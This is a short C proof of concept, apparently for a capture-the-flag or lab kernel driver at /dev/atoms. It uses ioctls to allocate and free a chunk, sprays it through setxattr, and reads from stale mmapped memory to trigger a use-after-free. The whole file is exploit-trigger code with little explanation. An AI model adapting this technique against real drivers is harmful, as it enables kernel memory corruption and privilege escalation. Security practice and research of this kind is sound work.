#include <stdio.h>
#include <stdlib.h>
#include <linux/ioctl.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <string.h>
#include <signal.h>

// IOCTL to get infos about the chunk (size 0x110)
#define IOCTL_INFO 0x8018d901

// IOCTL to free the chunk
#define IOCTL_FREE 0xd903

// IOCTL to alloc a page with user defined size.
#define IOCTL_ALLOC 0xc010d902

//IOCTL to create chunk if not yet allocated.
#define IOCTL_ALLOC_CHUNK 0x4008d900

int main(){
	
	int fd = open("/dev/atoms", O_RDWR);

	if(fd < 0){
		printf("ERROR CANNOT OPEN THE FILE\n");
		exit(0);
	}
	
	// Trying to allocate the chunk 0x110 size.
	ioctl(fd, IOCTL_ALLOC_CHUNK, 10);
	
	char *ptr = mmap(0, 0x6000, PROT_READ, MAP_SHARED, fd, 0);
	munmap(ptr, 0x1000);
	munmap(ptr+0x1000, 0x1000);
	munmap(ptr+0x2000, 0x1000);

	char buf[0x110];
	memset(buf, 0x4d, 0x110);
	*(unsigned int*)(buf+0xc) = 0x1;

	setxattr("/tmp", "x", buf, sizeof(buf), XATTR_CREATE);

	// Trying to free that memory from user space.
	ioctl(fd, IOCTL_FREE);

	//Trigger!
	char c = *(ptr+0x4000);

	printf("I will close the device now.\n");
	close(fd);
	return 0;
}
